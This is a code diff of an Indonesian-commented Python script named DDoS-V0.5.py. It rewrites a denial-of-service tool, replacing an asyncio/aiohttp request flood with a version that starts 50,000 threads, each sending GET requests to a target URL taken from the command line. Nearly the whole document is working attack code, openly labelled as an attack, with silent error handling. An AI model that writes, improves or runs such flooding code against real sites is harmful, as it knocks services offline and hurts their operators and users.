@@ -1,50 +1,39 @@
-import asyncio
-import aiohttp
+import requests
+import threading
 import sys
 import time
 
 # Fungsi untuk mengirim request
-async def send(session, url):
+def send(url):
     try:
-        async with session.get(url):
-            pass  # Biarkan request berjalan tanpa output
+        requests.get(url)
     except Exception as e:
-        pass  # Jika error, jangan tampilkan apapun
+        pass  # Tidak ada output error
 
-# Fungsi utama untuk mengatur serangan
-async def main(url, jumlah):
-    jumlah = int(jumlah)
-    conn = aiohttp.TCPConnector(limit_per_host=0)  # Koneksi tanpa batas
-    timeout = aiohttp.ClientTimeout(total=3)  # Timeout setiap request
-
-    # Menampilkan pesan sebelum serangan
+# Fungsi utama untuk melakukan DDoS
+def attack(url):
     print(f"\n[+] Proses Mengirim Serangan Ke IP Tersebut: {url}")
-    start = time.time()
+    
+    threads = []
+    start_time = time.time()
 
-    try:
-        # Membuat session dan menjalankan banyak request sekaligus
-        async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
-            tasks = [send(session, url) for _ in range(jumlah)]
-            await asyncio.gather(*tasks)
-    except Exception as e:
-        print(f"[!] Terjadi error: {e}")
-        return
+    # Menjalankan thread untuk mengirim request
+    for _ in range(50000):  # 50.000 request secara otomatis
+        thread = threading.Thread(target=send, args=(url,))
+        thread.start()
+        threads.append(thread)
 
-    # Menampilkan hasil setelah selesai
-    durasi = time.time() - start
-    print(f"[✓] Selesai Mengirim Serangan ({jumlah} request) dalam {durasi:.2f} detik\n")
+    # Menunggu semua thread selesai
+    for thread in threads:
+        thread.join()
 
+    end_time = time.time()
+    print(f"[✓] Selesai Mengirim Serangan (50.000 request) dalam {end_time - start_time:.2f} detik\n")
+
+# Fungsi utama yang menerima input dan memulai serangan
 if __name__ == "__main__":
-    if len(sys.argv) < 3:
-        print("[!] Penggunaan: python DDoS-V0.5.py <url> <jumlah_request>")
+    if len(sys.argv) < 2:
+        print("Usage: python DDoS-V0.5.py <url>")
     else:
-        url = sys.argv[1]  # IP atau URL target
-        jumlah = sys.argv[2]  # Jumlah request yang akan dikirim
-        try:
-            # Memastikan kita mengirim dalam waktu 5 detik
-            print("[!] Mulai serangan...")
-            asyncio.run(main(url, jumlah))  # Jalankan fungsi utama
-        except KeyboardInterrupt:
-            print("\n[!] Serangan dihentikan oleh user.")
-        except Exception as e:
-            print(f"[!] Terjadi kesalahan: {e}")
+        url = sys.argv[1]  # URL target
+        attack(url)
